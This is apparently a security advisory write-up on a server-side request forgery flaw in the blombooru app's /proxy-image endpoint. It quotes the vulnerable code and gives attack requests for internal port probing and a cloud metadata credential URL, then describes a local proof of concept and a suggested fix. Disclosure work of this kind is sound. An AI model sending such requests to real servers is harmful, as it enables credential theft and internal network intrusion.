## Report  mrblomblo/blombooru

### Target Overview

| Field | Detail |
|---|---|
| Repository | https://github.com/mrblomblo/blombooru |
| Description | Self-hosted media tagging application |
| Language | Python (FastAPI) |
| Stars | ~50 |
| Contributors | 1 |
| Last Commit | April 2026 |
| Status | Actively maintained |

### Vulnerability

**Title:** Server-Side Request Forgery (SSRF) via unvalidated URL parameter in `/proxy-image` endpoint

**CWE:** CWE-918 — Server-Side Request Forgery  
**Severity:** Medium (standalone) / High (cloud deployment)  
**Advisory:** GHSA-5c5w-x8jp-fjqw  
**Status:** Pending developer response  

### Affected File

`backend/app/routes/booru_import.py` — function `proxy_image()`

### Vulnerable Code

```python
@router.get("/proxy-image")
async def proxy_image(
    url: str,
    current_user: User = Depends(require_admin_mode),
    db: Session = Depends(get_db)
):
    if not url.startswith("http"):   # only protection — trivially bypassed
        raise HTTPException(...)

    client = get_client_for_url(url, db=db)
    if client:
        external_resp = client.session.get(url, ...)
    else:
        # no client matched — falls through with zero filtering
        external_resp = requests.get(url, stream=True, timeout=60,
            headers={"User-Agent": "Blombooru/1.0 (booru-import)"})

    return StreamingResponse(external_resp.iter_content(...), ...)
```

### Root Cause

The endpoint accepts a user-supplied `url` parameter and fetches it server-side. The only validation is `startswith("http")` which is trivially bypassed by internal addresses. The `get_client_for_url()` function performs zero IP validation — if the URL doesn't match a known booru domain, it returns `None` and the request falls through to `requests.get()` with no filtering.

`requests.get()` follows redirects by default (`allow_redirects=True`), enabling redirect-chain bypasses via open redirects on trusted domains.

### Attack Scenarios

**Internal service enumeration:**
```
GET /api/booru-import/proxy-image?url=http://127.0.0.1:6379
GET /api/booru-import/proxy-image?url=http://127.0.0.1:5432
```

**Cloud metadata credential theft:**
```
GET /api/booru-import/proxy-image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Redirect chain bypass:**
```
requests.get() follows redirects by default.
An open redirect on a trusted domain can bounce to http://169.254.169.254/
```

### Live PoC

Tested on local instance (Python installation, PostgreSQL 18).

**Request 1 — Internal Redis port (6379):**
```
GET /api/booru-import/proxy-image?url=http://127.0.0.1:6379
```
**Response:**
```json
{"detail":"admin.media_management.booru_import.error_proxy_failed:::Proxy failed"}
```
The error confirms the server attempted a TCP connection to the internal Redis port. The failure response proves the request left the application layer and reached the network layer internally.

**Request 2 — Recursive self-request (port 8000):**
```
GET /api/booru-import/proxy-image?url=http://127.0.0.1:8000
```
The server hung indefinitely — recursively proxying its own responses. Confirms arbitrary internal HTTP request execution.

### Impact

- Internal network port scanning
- Cloud metadata endpoint access — IAM credential theft on AWS/GCP/Azure deployments
- Bypasses network-level firewall rules — internal services unreachable externally become reachable through the server
- Admin credentials obtainable via phishing or session theft, making this exploitable by external attackers

### Suggested Fix

```python
from ipaddress import ip_address, ip_network
from urllib.parse import urlparse

BLOCKED_RANGES = [
    ip_network("127.0.0.0/8"),
    ip_network("10.0.0.0/8"),
    ip_network("172.16.0.0/12"),
    ip_network("192.168.0.0/16"),
    ip_network("169.254.0.0/16"),
]

def is_ssrf_safe(url: str) -> bool:
    parsed = urlparse(url)
    host = parsed.hostname
    if not host or host in {"localhost"}:
        return False
    try:
        addr = ip_address(host)
        return not any(addr in net for net in BLOCKED_RANGES)
    except ValueError:
        return True
```

Also set `allow_redirects=False` on the requests call.

### Disclosure Timeline

| Date | Event |
|---|---|
| 2026-05-13 | Vulnerability identified via static code review |
| 2026-05-14 | Live PoC confirmed on local instance |
| 2026-05-14 | GitHub Security Advisory submitted — GHSA-5c5w-x8jp-fjqw |
| 2026-05-14 | PoC evidence and screenshot added to advisory |
| TBD | Developer response |
| TBD | CVE assigned |

---



## Summary

| Target | Vuln | Severity | Status |
|---|---|---|---|
| blombooru | SSRF — unvalidated proxy URL | Medium/High | Advisory live — pending response |



